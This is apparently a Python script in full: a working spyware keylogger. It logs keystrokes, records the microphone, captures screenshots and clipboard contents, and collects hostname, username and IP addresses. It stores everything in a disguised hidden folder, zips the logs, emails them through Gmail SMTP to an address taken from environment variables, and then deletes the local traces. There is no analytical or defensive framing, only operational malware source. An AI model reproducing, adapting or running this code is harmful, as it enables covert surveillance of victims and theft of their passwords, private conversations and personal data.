# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.application import MIMEApplication
from email import encoders
import smtplib

import socket
import platform

import clipboard # Using clipboard instead of win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

from datetime import datetime

import sys
from zipfile import ZipFile

# OS information fetch

current_OS = platform.system()
current_user = os.getlogin()
logpath = ""

# Directory creation for log files. MacOS currently not supported

directory_name = "logconfig"

if(current_OS == 'Linux'):
    logpath = "/home/" + current_user + "/.cache/" + directory_name + "/"
elif(current_OS == 'Windows'):
    logpath = "C:\\Users\\" + current_user + "\\" + directory_name + "\\"
    
if not os.path.exists(logpath):
    os.makedirs(logpath)

# Variables

system_information = "system.txt"
audio_information = "audio.wav"
clipboard_information = "clipboard.txt"
screenshot_information_beg = "screenshot_beg.png"
screenshot_information_end = "screenshot_end.png"
keys_information = "key_log.txt"

# Encrypted files

# system_information_enc = 'enc_system.txt'
# clipboard_information_enc = 'enc_clipboard.txt'
# keys_information_enc = 'enc_keys_logged.txt'

duration = 45
stopping_time = 0
file_prefix = str(datetime.now())[0:19]

def on_press_func(key):
        try:
            if time.time() > stopping_time:
                listener.stop()
            else:
                key_f.write(key.char)
        except AttributeError:
            key_f.write('(' + str(key) + ')')

def take_screenshot(file_name):
    screenshot = ImageGrab.grab()
    screenshot.save(logpath + file_prefix + file_name)
    screenshot.close()

# System Information

sys_details = {}

sys_details.update({'architecture' : platform.architecture()})
sys_details.update({'system_info' : platform.system()})
sys_details.update({'uname' : platform.uname()})
sys_details.update({'hostname' : socket.gethostname()})
sys_details.update({'current_user' : current_user})

# print(sys_details.items())

# sys_details[internal_IP] = socket.gethostbyname(hostname) # Usually returns loopback address

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
s.connect(("8.8.8.8", 80))

sys_details.update({'private_IP' : s.getsockname()[0] }) # Will return the private IP of the machine
sys_details.update({'external_IP' : get('https://api.ipify.org').text})

sys_f = open(logpath + file_prefix + system_information, 'a')

for item in sys_details.items():
    sys_f.write(str(item) + '\n\n')

sys_f.write('Clipboard Contents: ' + '\n\t' + clipboard.paste() + '\n')

sys_f.close()

# Keylogging, Microphone Capture and Screenshotting

sampling_freq = 44100

myrecording = sd.rec(int(duration * sampling_freq), samplerate=sampling_freq, channels=2)

take_screenshot(screenshot_information_beg)

key_f = open(logpath + file_prefix + keys_information, 'a')

stopping_time = time.time() + duration

with Listener(
        on_press=on_press_func) as listener:
    listener.join()

key_f.close()
sd.wait()

write(logpath + file_prefix + audio_information, sampling_freq, myrecording)

take_screenshot(screenshot_information_end)

# Creating zipfile of all log files

all_files = os.listdir(logpath)
zipfile_name = 'Zipped_logs_' + str(datetime.now()) + '.zip'
zipfile_full_path = logpath + zipfile_name

with ZipFile(zipfile_full_path, 'w') as zipobj:
    for file in all_files:
        full_path = logpath + file
        zipobj.write(full_path)

# Sending the zipfile over Email

subject = "LogFiles - " + str(sys_details.get('hostname')) + " " + str(sys_details.get('current_user')) + " - " + str(datetime.now())
body = "Loren Ipsum"
sender_email = os.environ['SENDER_EMAIL']
recipient_email = os.environ['RECEIVER_EMAIL']
sender_password = os.environ['SENDER_EMAIL_PWD']
smtp_server = 'smtp.gmail.com'
smtp_port = 465
path_to_file = zipfile_full_path

message = MIMEMultipart()
message['Subject'] = subject
message['From'] = sender_email
message['To'] = recipient_email
message.attach(MIMEText(body))

with open(zipfile_full_path,'rb') as file:
    message.attach(MIMEApplication(file.read(), Name=zipfile_name))

with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
   server.login(sender_email, sender_password)
   server.sendmail(sender_email, recipient_email, message.as_string())

#Code to delete all the files after the Zipfile is sent over mail

all_files = os.listdir(logpath)
for file in all_files:
        full_path = logpath + file
        os.remove(full_path)
os.rmdir(logpath)

sys.exit()